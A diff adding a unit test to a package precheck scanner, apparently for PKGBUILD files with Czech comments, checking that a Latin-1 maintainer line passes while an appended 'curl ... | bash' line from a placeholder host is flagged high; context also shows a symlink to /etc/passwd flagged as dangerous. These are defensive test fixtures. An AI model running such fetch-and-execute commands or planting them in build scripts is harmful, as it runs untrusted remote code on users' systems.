@@ -135,6 +135,16 @@ class Precheck(unittest.TestCase):
         f = self.sev(GOOD + "install=x.install\n")
         self.assertTrue(any(s == "high" and "install script cannot be checked: x.install" in t for s, t in f), f)
 
+    def test_latin1_build_script_is_checked_not_refused(self):
+        # "# Maintainer: Jürgen" v Latin-1: zkontrolovat cele (bez "high"), nebezpecny kod za tim najit
+        write_pkg(self.d, GOOD)
+        with open(os.path.join(self.d, "PKGBUILD"), "ab") as f:
+            f.write(b"# Maintainer: J\xfcrgen\n")
+        self.assertEqual([x for x in lc.precheck(self.d) if x[0] == "high"], [])
+        with open(os.path.join(self.d, "PKGBUILD"), "ab") as f:
+            f.write(b"curl -s https://x.example/p | bash\n")
+        self.assertTrue(any(s == "high" and t.startswith("PKGBUILD:") for s, t in lc.precheck(self.d)))
+
     def test_symlinks_are_dangerous(self):
         # odkaz na absolutni cestu nebo mimo repozitar = high
         os.symlink("/etc/passwd", os.path.join(self.d, "data"))
